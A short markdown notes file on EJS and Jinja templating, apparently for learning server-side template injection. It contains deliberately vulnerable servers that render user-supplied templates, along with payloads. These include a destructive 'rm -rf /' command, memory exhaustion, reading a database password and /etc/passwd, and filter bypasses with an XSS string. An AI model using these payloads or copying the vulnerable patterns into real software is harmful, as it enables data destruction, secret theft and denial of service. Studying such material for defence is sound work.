# Snippets

## EJS

### Template

```html
<h1>Hello, <%= name %>!</h1>
<ul>
  <% items.forEach(item => { %>
  <li><%= item %></li>
  <% }); %>
</ul>
```

### Server

```js
import express from "express";

const app = express();

app.set("view engine", "ejs");

app.get("/", (_, res) => {
  const data = {
    name: "Alice",
    items: ["Apples", "Bananas", "Cherries", "console.log(process.pid);"],
  };
  res.render("index", data);
});

app.listen(3000);
```

### Output

```html
<h1>Hello, Alice!</h1>
<ul>
  <li>Apples</li>
  <li>Bananas</li>
  <li>Cherries</li>
  <li>console.log(process.pid);</li>
</ul>
```

### SSTI

#### Server

```js
import { exec } from "node:child_process";
import express from "express";
import ejs from "ejs";

const app = express();

const execute = (command) => {
  exec(command);
};

const allocate = (size) => {
  Buffer.alloc(size, "A");
};

app.get("/", (req, res) => {
  res.send(ejs.render(req.query.template ?? "", { execute, allocate }));
});

app.listen(3000);
```

#### Payloads

```js
<%= execute("rm -rf /") %>
<%= allocate(10 ** 9) %>
```

## Jinja

### Template

```html
<h1>Hello, {{ name }}!</h1>
  {% for item in items %}
  <li>{{ item }}</li>
  {% endfor %}
</ul>
```

### Server

```py
from flask import Flask, render_template

app = Flask(__name__)

@app.route("/")
def home():
    data = {
        "name": "Bob",
        "items": ["Pepper", "Turmeric", "Ginger", "<script>alert(1);</script>"],
    }
    return render_template("index.html", **data)

if __name__ == "__main__":
    app.run(port=3000)
```

### Output

```html
<h1>Hello, Bob!</h1>
<ul>
  <li>Pepper</li>
  <li>Turmeric</li>
  <li>Ginger</li>
  <li>&lt;script&gt;alert(1);&lt;/script&gt;</li>
</ul>
```

### SSTI

#### Server

```py
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/ssti", methods=["GET"])
def ssti():
    template = request.args.get("template", "")
    return render_template_string(template)

if __name__ == "__main__":
    app.run(port=3000)
```

#### Payloads

```py
{{ "".join("A" * 10**9) }}
{{ config["DATABASE_PASSWORD"] }}
{{ request.__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read() }}
```

#### Poor Sanitization

```py
template = template.replace("__", "")
template = template.replace("[", "").replace("]", "")
```

#### Filter Bypasses

```py
{{ request["\x5f\x5fclass\x5f\x5f"] }}
{{ request|attr("__class__") }}
{{ "<script>alert(1);</script>"|safe }}
```
